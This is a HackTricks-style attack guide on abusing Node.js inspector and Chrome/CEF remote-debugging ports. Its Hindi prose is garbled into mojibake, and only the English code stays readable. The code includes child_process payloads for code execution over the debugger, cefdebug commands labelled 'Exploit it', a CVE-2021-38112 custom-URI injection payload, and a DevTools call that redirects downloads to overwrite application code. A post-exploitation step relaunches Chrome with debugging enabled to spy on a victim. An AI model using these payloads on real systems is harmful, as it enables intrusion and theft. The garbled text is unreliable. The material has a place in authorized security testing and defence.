# рдиреЛрдб рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░/CEF рдбреАрдмрдЧ рджреБрд░реБрдкрдпреЛрдЧ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> рдХреЗ рд╕рд╛рде рдЬреАрд░реЛ рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks** рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live) рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` рд╕реНрд╡рд┐рдЪ рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЬрд╛рдП, рддреЛ рдПрдХ рдиреЛрдб.рдЬреЗрдПрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдПрдХ рдбреАрдмрдЧрд┐рдВрдЧ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд▓рд┐рдП рд╕реБрдирддреА рд╣реИред **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд░реВрдк рд╕реЗ, рдпрд╣ рд╣реЛрд╕реНрдЯ рдФрд░ рдкреЛрд░реНрдЯ **`127.0.0.1:9229`** рдкрд░ рд╕реБрдиреЗрдЧрд╛ред рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдПрдХ **рдЕрджреНрд╡рд┐рддреАрдп** **UUID** рднреА рд╕реМрдВрдкрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЛ рд╣реЛрд╕реНрдЯ рдкрддрд╛, рдкреЛрд░реНрдЯ, рдФрд░ UUID рдХреЛ рдЬреЛрдбрд╝рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рд╡реЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХреЗрдВред рдкреВрд░рд╛ URL рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рджрд┐рдЦреЗрдЧрд╛ `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`ред

{% hint style="warning" %}
рдХреНрдпреЛрдВрдХрд┐ **рдбреАрдмрдЧрд░ рдХреЛ рдиреЛрдб.рдЬреЗрдПрд╕ рдирд┐рд╖реНрдкрд╛рджрди рд╡рд╛рддрд╛рд╡рд░рдг рдХрд╛ рдкреВрд░рд╛ рдПрдХреНрд╕реЗрд╕** рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕ рдкреЛрд░реНрдЯ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╡рд╛рд▓рд╛ рдПрдХ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдЕрднрд┐рдиреЗрддрд╛ рдиреЛрдб.рдЬреЗрдПрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкрдХреНрд╖ рдореЗрдВ рдЕрд░реНрдмрд┐рдЯреНрд░реЗ рдХреЛрдб рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ (**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирддрд┐**ред)
{% endhint %}

рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВ:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
рдЬрдм рдЖрдк рдПрдХ inspected process рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХрд╛ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) рдЬреИрд╕реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ **рдбреАрдмрдЧрд░** (SSRF рд╕реБрд░рдХреНрд╖рд╛ рдмрд╣реБрдд рд╣реА рд╕рдорд╛рди рд░рд╣рддреА рд╣реИ) рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ: `--remote-debugging-port=9222`ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпреЗ **NodeJS** **рдбреАрдмрдЧ** рд╕рддреНрд░ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреА рдмрдЬрд╛рдп рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рд╕рд╛рде [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ, рдпрд╣ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рд╕реАрдзрд╛ RCE рдирд╣реАрдВ рд╣реИред

рдЬрдм рдЖрдк рдбреАрдмрдЧ рдХрд┐рдП рдЧрдП рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### рдмреНрд░рд╛рдЙрдЬрд╝рд░, рд╡реЗрдмрд╕реЙрдХреЗрдЯ рдФрд░ рд╕рдорд╛рди-рдореВрд▓ рдиреАрддрд┐ <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

рд╡реЗрдм-рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рдЦреБрд▓реА рд╡реЗрдмрд╕рд╛рдЗрдЯреЗрдВ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реБрд░рдХреНрд╖рд╛ рдореЙрдбрд▓ рдХреЗ рддрд╣рдд WebSocket рдФрд░ HTTP рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреА рд╣реИрдВред **рдПрдХ рдкреНрд░рд╛рд░рдВрднрд┐рдХ HTTP рдХрдиреЗрдХреНрд╢рди** рдХреЛ **рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рдбреАрдмрдЧрд░ рд╕рддреНрд░ рдЖрдИрдбреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред **рд╕рдорд╛рди рдореВрд▓ рдиреАрддрд┐** рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЛ **рдЗрд╕ HTTP рдХрдиреЗрдХреНрд╢рди** рдХреЛ рдмрдирд╛рдиреЗ рд╕реЗ рд░реЛрдХрддреА рд╣реИред [**DNS rebinding рд╣рдорд▓реЛрдВ**](https://en.wikipedia.org/wiki/DNS\_rebinding)**** рдХреЗ рдЦрд┐рд▓рд╛рдл рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП, Node.js рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП **'Host' рд╣реЗрдбрд░реНрд╕** рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ **рдПрдХ рдЖрдИрдкреА рдкрддрд╛** рдпрд╛ **`localhost`** рдпрд╛ **`localhost6`** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреЗ рд╣реИрдВред

{% hint style="info" %}
рдпрд╣ **рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ** рдХреЛрдб рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдмрд╕ рдПрдХ HTTP рдЕрдиреБрд░реЛрдз рднреЗрдЬрдХрд░** (рдЬреЛ рдПрдХ SSRF vuln рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛)ред
{% endhint %}

### рдЪрд▓ рд░рд╣реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рд╢реБрд░реВ рдХрд░рдирд╛

рдЖрдк рдПрдХ рдЪрд▓ рд░рд╣реЗ nodejs рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ рдореЗрдВ рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рд╢реБрд░реВ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕рд┐рдЧреНрдирд▓ SIGUSR1** рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЖрдкрдХреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдВрджрд░ рдХреА рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдХреЗ рд▓рд┐рдП **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рдкрд╣реБрдВрдЪ** рджреЗ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд╕реАрдзрд╛ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирддрд┐ рдирд╣реАрдВред
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
рдпрд╣ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдмрдВрдж рдХрд░рдХреЗ рдПрдХ рдирдпрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╢реБрд░реВ рдХрд░рдирд╛** `--inspect` рдХреЗ рд╕рд╛рде **рдПрдХ рд╡рд┐рдХрд▓реНрдк рдирд╣реАрдВ** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдХрдВрдЯреЗрдирд░** рдХреЗ рд╕рд╛рде **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдХреЛ **рдорд╛рд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред
{% endhint %}

### рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░/рдбреАрдмрдЧрд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВ

**рдХреНрд░реЛрдорд┐рдпрдо-рдЖрдзрд╛рд░рд┐рдд рдмреНрд░рд╛рдЙрдЬрд╝рд░** рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, Chrome рдпрд╛ Edge рдХреЗ рд▓рд┐рдП `chrome://inspect` рдпрд╛ `edge://inspect` URL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред Configure рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ **рд▓рдХреНрд╖рд┐рдд рд╣реЛрд╕реНрдЯ рдФрд░ рдкреЛрд░реНрдЯ** рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╕реВрдЪреАрдмрджреНрдз рд╣реИрдВред рдЫрд╡рд┐ рдореЗрдВ рдПрдХ рд░рд┐рдореЛрдЯ рдХреЛрдб рдирд┐рд╖реЗрдзрди (RCE) рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (620) (1).png>)

**рдХрдорд╛рдВрдб рд▓рд╛рдЗрди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдбреАрдмрдЧрд░/рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
рдпрд╣ рдЙрдкрдХрд░рдг [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдЪрд▓ рд░рд╣реЗ **рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░реНрд╕** рдХреЛ **рдЦреЛрдЬрдиреЗ** рдФрд░ рдЙрдирдореЗрдВ **рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **NodeJS RCE рдЙрддреНрдкрд╛рджрди** рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдВрдЧреЗ рдЕрдЧрд░ [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (рдЖрдкрдХреЛ рдЗрд╕рдХреЗ рд╕рд╛рде рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджрд┐рд▓рдЪрд╕реНрдк рдЪреАрдЬреЗрдВ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП API рдХреА рдЬрд╛рдБрдЪ рдХрд░рдиреА рд╣реЛрдЧреА)ред
{% endhint %}

## NodeJS Debugger/Inspector рдореЗрдВ RCE

{% hint style="info" %}
рдпрджрд┐ рдЖрдк рдпрд╣рд╛рдБ рдЖрдХрд░ [**Electron рдореЗрдВ XSS рд╕реЗ RCE рдХреИрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдЗрд╕ рдкреГрд╖реНрда рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВред**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХреЗ **RCE** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрдм рдЖрдк рдПрдХ Node **inspector** рд╕реЗ **рдХрдиреЗрдХреНрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЙрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ (рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ **Chrome DevTools protocol** рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрд╢рди рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛)ред
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

рдЖрдк рдпрд╣рд╛рдБ API рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
рдЗрд╕ рдЦрдВрдб рдореЗрдВ рдореИрдВ рдмрд╕ рдЙрди рджрд┐рд▓рдЪрд╕реНрдк рдЪреАрдЬреЛрдВ рдХреА рд╕реВрдЪреА рджреЗрдиреЗ рд╡рд╛рд▓рд╛ рд╣реВрдВ рдЬрд┐рдиреНрд╣реЗрдВ рд▓реЛрдЧ рдЗрд╕ protocol рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рд╣реИред

### рдЧрд╣рд░реЗ рд▓рд┐рдВрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдВрдЬреЗрдХреНрд╢рди

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) рдореЗрдВ Rhino рд╕реБрд░рдХреНрд╖рд╛ рдиреЗ рдкрд╛рдпрд╛ рдХрд┐ CEF рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдиреЗ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдПрдХ рдХрд╕реНрдЯрдо URI (workspaces://) рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд┐рдпрд╛ рдерд╛ рдЬреЛ рдкреВрд░реНрдг URI рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рдерд╛ рдФрд░ рдлрд┐рд░ рдЙрд╕ URI рд╕реЗ рдЖрдВрд╢рд┐рдХ рд░реВрдк рд╕реЗ рдирд┐рд░реНрдорд┐рдд рдПрдХ рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЗ рд╕рд╛рде CEF рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░рддрд╛ рдерд╛ред

рдкрд╛рдпрд╛ рдЧрдпрд╛ рдХрд┐ URI рдкреИрд░рд╛рдореАрдЯрд░ URL рдбреАрдХреЛрдб рдХрд┐рдП рдЧрдП рдереЗ рдФрд░ CEF рдЖрдзрд╛рд░рд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдереЗ, рдЬрд┐рд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдзреНрд╡рдЬ **`--gpu-launcher`** рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдереА рдФрд░ рд╡рд┐рд╡рд┐рдз рдЪреАрдЬреЗрдВ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдереАред

рддреЛ, рдПрдХ рдкреЗрд▓реЛрдб рдЬреИрд╕реЗ:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░реЗрдВ

**рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЗрдВ рдХреЛ рдмрдЪрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛** рдХреЗ рд▓рд┐рдП рдлрд╝реЛрд▓реНрдбрд░ рдмрджрд▓реЗрдВ рдФрд░ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ рдЬрд┐рд╕рд╕реЗ рдЖрдк рдЕрдкрдиреЗ **рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдХреЛрдб** рдХреЗ рд╕рд╛рде рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ **рд╕реНрд░реЛрдд рдХреЛрдб** рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE рдФрд░ рдбреЗрдЯрд╛ рдЙрддреНрдкреАрдбрд╝рди

рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЗ рдЕрдиреБрд╕рд╛рд░: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) рдереЗрд░рд┐рд╡рд░ рд╕реЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдФрд░ рдЖрдВрддрд░рд┐рдХ рдкреЗрдЬреЛрдВ рдХреЛ рдбреЗрдЯрд╛ рдЙрддреНрдкреАрдбрд╝рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

### рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди

рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдФрд░ **рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ PC рдХреЛ рдХрдВрдкреНрд░рдорд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж** рдЬреЛ Chrome/Chromium рдЖрдзрд╛рд░рд┐рдд рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЖрдк рдбреАрдмрдЧрд┐рдВрдЧ рд╕рдХреНрд░рд┐рдп рдХрд░рдХреЗ рдПрдХ Chrome рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдбреАрдмрдЧрд┐рдВрдЧ рдкреЛрд░реНрдЯ рдХреЛ рдлреЙрд░рд╡рд░реНрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХреЗрдВред рдЗрд╕ рддрд░рд╣ рдЖрдк **рд╡рд┐рдХреНрдЯрд┐рдо рдЬреЛ Chrome рдХреЗ рд╕рд╛рде рдХреБрдЫ рднреА рдХрд░рддрд╛ рд╣реИ рдХреА рд╕рднреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХреЗрдВ рдФрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЪреБрд░рд╛ рд╕рдХреЗрдВрдЧреЗ**ред

рдЧреБрдкреНрдд рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ **рд╣рд░ Chrome рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░реЗрдВ** рдФрд░ рдлрд┐рд░ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХрд╛ рдХреЙрд▓ рдХрд░реЗрдВ
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## рд╕рдВрджрд░реНрдн

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
